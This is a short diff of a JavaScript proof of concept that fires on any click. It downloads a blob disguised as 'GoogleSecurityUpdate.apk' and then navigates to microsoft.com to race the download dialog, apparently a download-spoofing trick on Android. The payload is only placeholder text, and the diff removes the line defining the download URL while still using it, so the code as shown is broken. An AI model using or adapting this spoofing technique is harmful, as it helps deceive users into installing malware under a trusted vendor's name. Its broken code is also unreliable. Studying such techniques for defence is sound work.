@@ -9,17 +9,16 @@
 <script>
 document.addEventListener('click', () => {
     // Trigger download dialog Android
-    const blob = new Blob(['malicious content'], {type: 'application/octet-stream'});
-    const url = URL.createObjectURL(blob);
-    
+    const blob = new Blob(['malicious content'], {type: 'application/vnd.android.package-archive'});
     const a = document.createElement('a');
+  
     a.href = url;
-    a.download = 'Malicious.bin';
+    a.download = 'GoogleSecurityUpdate.apk';
     a.click();
     
     // Race: navigate after dialog appears
     setTimeout(() => {
-        window.location.href = 'https://google.com';
+        window.location.href = 'https://www.microsoft.com';
     }, 500);  // Android perlu lebih cepat karena download langsung ke notif bar
 });
 </script>
